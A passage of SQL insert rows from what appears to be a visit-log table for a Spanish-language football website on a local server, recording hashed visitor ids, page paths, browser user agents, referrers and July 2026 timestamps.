(217,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/http://192.168.0.57:8080/backend/upload_image/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-28 17:36:15'),
(218,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/news',0,'2026-07-28 17:45:22'),
(219,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/femenina','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-28 17:49:52'),
(220,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/news','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/femenina',0,'2026-07-28 17:50:01'),
(221,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/noticia/13','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/femenina',0,'2026-07-28 17:50:04'),
(222,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/noticia/131111','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-28 17:50:07'),
(223,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/seleccion','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/copa-presidente',0,'2026-07-28 17:50:27'),
(224,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/register','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/copa-presidente',0,'2026-07-28 17:50:38'),
(225,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/manage-seleccion-sub20',0,'2026-07-28 18:16:45'),
(226,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/manage-seleccion-sub20','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/manage-seleccion-sub20',0,'2026-07-28 18:18:09'),
(227,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-29 02:27:19'),
(228,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/forgot-password','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/users',0,'2026-07-29 02:39:48'),
(229,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/users','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/settings',0,'2026-07-29 02:39:59'),
(230,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/settings','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-29 02:40:03'),
(231,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 02:40:04'),
(232,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/users',0,'2026-07-29 02:47:42'),
(233,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/users',0,'2026-07-29 05:29:43'),
(234,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 05:29:50'),
(235,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/perfil','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 05:29:54'),
(236,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 05:30:08'),
(237,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 07:22:04'),
(238,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 07:32:36'),
(239,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/register','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 07:32:38'),
(240,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 08:55:05'),
(241,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/login','Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 08:56:06'),
(242,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 18:38:19'),
(243,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/users','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 18:38:20'),
(244,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 18:38:20'),
(245,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/perfil','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','',0,'2026-07-29 18:39:53'),
(246,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/femenina','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/perfil',0,'2026-07-29 18:47:06'),
(247,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/news','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/femenina',0,'2026-07-29 18:49:04'),
(248,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/users',0,'2026-07-29 21:35:30'),
(249,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/users',0,'2026-07-29 21:35:37'),
(250,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/perfil','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/users',0,'2026-07-29 21:36:17'),
(251,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-29 21:36:54'),
(252,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/ascenso','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-29 21:37:22'),
(253,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/reservas','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/ascenso',0,'2026-07-29 21:37:23'),
(254,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/burgerking','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/reservas',0,'2026-07-29 21:37:28'),
(255,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/femenina','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/burgerking',0,'2026-07-29 21:37:34'),
(256,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/news','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/femenina',0,'2026-07-29 21:37:42'),
(257,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/noticia/17','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/femenina',0,'2026-07-29 21:37:46'),
(258,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/seleccion','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/noticia/17',0,'2026-07-29 21:37:55'),
(259,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/noticia/14','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-29 21:40:04'),
(260,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/register','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-29 21:40:14'),
(261,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/terms','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-29 21:40:17'),
(262,'53b541d65e56e4845b61d6c2e3ae98c65695fb2e5ca989848572fca4fc0db802','/privacy','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-29 21:40:26'),
(263,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-30 02:43:07'),
(264,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-30 02:47:43'),
(265,'c467a07a4646dcd57d43c213f3096c821af1606fff2bf43d57698e6440955566','/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36','',0,'2026-07-30 03:49:33'),
(266,'c467a07a4646dcd57d43c213f3096c821af1606fff2bf43d57698e6440955566','/login','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36','',0,'2026-07-30 03:49:53'),
(267,'c467a07a4646dcd57d43c213f3096c821af1606fff2bf43d57698e6440955566','/register','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36','',0,'2026-07-30 03:49:58'),
(268,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/','Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0','',0,'2026-07-30 04:30:54'),
(269,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/noticia/15','Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0','',0,'2026-07-30 04:40:13'),
(270,'094f438302b01fdabe7a3c96b17861a156c12602db286bb3f73e83cbacf592e2','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-30 18:56:36'),
(271,'094f438302b01fdabe7a3c96b17861a156c12602db286bb3f73e83cbacf592e2','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-30 18:57:10'),
(272,'094f438302b01fdabe7a3c96b17861a156c12602db286bb3f73e83cbacf592e2','/register','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-30 18:57:12'),
(273,'094f438302b01fdabe7a3c96b17861a156c12602db286bb3f73e83cbacf592e2','/terms','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-30 18:57:31'),
(274,'094f438302b01fdabe7a3c96b17861a156c12602db286bb3f73e83cbacf592e2','/forgot-password','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-30 19:13:55'),
(275,'094f438302b01fdabe7a3c96b17861a156c12602db286bb3f73e83cbacf592e2','/dashboard','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-30 19:21:03'),
(276,'094f438302b01fdabe7a3c96b17861a156c12602db286bb3f73e83cbacf592e2','/perfil','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-30 19:21:03'),
(277,'094f438302b01fdabe7a3c96b17861a156c12602db286bb3f73e83cbacf592e2','/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-30 19:41:31'),
(278,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/posiciones',0,'2026-07-30 21:24:22'),
(279,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/perfil','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/perfil',0,'2026-07-31 02:08:03'),
(280,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/perfil',0,'2026-07-31 02:08:08'),
(281,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/',0,'2026-07-31 02:08:19'),
(282,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/noticia/17','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/primera',0,'2026-07-31 02:08:37'),
(283,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/reservas','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/primera',0,'2026-07-31 02:08:47'),
(284,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/ascenso','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/reservas',0,'2026-07-31 02:08:50'),
(285,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/burgerking','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/ascenso',0,'2026-07-31 02:08:55'),
(286,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/femenina','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/burgerking',0,'2026-07-31 02:08:57'),
(287,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/news','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/femenina',0,'2026-07-31 02:09:01'),
(288,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/copa-presidente','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/news',0,'2026-07-31 02:09:05'),
(289,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/seleccion','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/copa-presidente',0,'2026-07-31 02:09:12'),
(290,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/seleccion-femenina','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/seleccion',0,'2026-07-31 02:09:14'),
(291,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/seleccion-sub20','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/seleccion-femenina',0,'2026-07-31 02:09:16'),
(292,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/seleccion-sub17','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/seleccion-sub20',0,'2026-07-31 02:09:20'),
(293,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/seleccion-sub20',0,'2026-07-31 02:09:22'),
(294,'d6d647605b9c1534c4f3500b7727b2eeebe91750bd70442228dfdbfbf3b1c7b1','/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36','',0,'2026-07-31 03:31:26'),
(295,'d6d647605b9c1534c4f3500b7727b2eeebe91750bd70442228dfdbfbf3b1c7b1','/login','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36','',0,'2026-07-31 03:31:32'),
(296,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/seleccion-sub20',0,'2026-07-31 03:32:55'),
(297,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/users',0,'2026-07-31 04:35:38'),
(298,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/settings','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/users',0,'2026-07-31 04:57:00'),
(299,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','',0,'2026-07-31 05:30:04'),
(300,'17d5db900d0e3a924b38c4f5510f9ec98d70e5451146db67f22eb0895f8f2b83','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0','http://192.168.0.57:8080/settings',0,'2026-07-31 05:55:22'),
(301,'4924af011c4c7c7d658f02eb8535558b823a2f8f657caf4eb6520f709e91d3e6','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/settings',0,'2026-07-31 13:32:35'),
(302,'4924af011c4c7c7d658f02eb8535558b823a2f8f657caf4eb6520f709e91d3e6','/forgot-password','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-31 13:37:40'),
(303,'4924af011c4c7c7d658f02eb8535558b823a2f8f657caf4eb6520f709e91d3e6','/forgot-password','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-31 15:49:38'),
(304,'4924af011c4c7c7d658f02eb8535558b823a2f8f657caf4eb6520f709e91d3e6','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-31 15:54:04'),
(305,'4924af011c4c7c7d658f02eb8535558b823a2f8f657caf4eb6520f709e91d3e6','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-31 15:55:48'),
(306,'4924af011c4c7c7d658f02eb8535558b823a2f8f657caf4eb6520f709e91d3e6','/admin/copa','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-31 15:55:54'),
(307,'4924af011c4c7c7d658f02eb8535558b823a2f8f657caf4eb6520f709e91d3e6','/users','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-31 15:55:55'),
(308,'4924af011c4c7c7d658f02eb8535558b823a2f8f657caf4eb6520f709e91d3e6','/settings','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-31 15:55:56'),
(309,'2e1ade44dea83033951834f412a34da0817a8fc988f9b9f1df55c2a9d8267d13','/login','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-31 15:58:35'),
(310,'2e1ade44dea83033951834f412a34da0817a8fc988f9b9f1df55c2a9d8267d13','/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-31 15:58:38'),
(311,'2e1ade44dea83033951834f412a34da0817a8fc988f9b9f1df55c2a9d8267d13','/primera','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-31 16:02:41'),
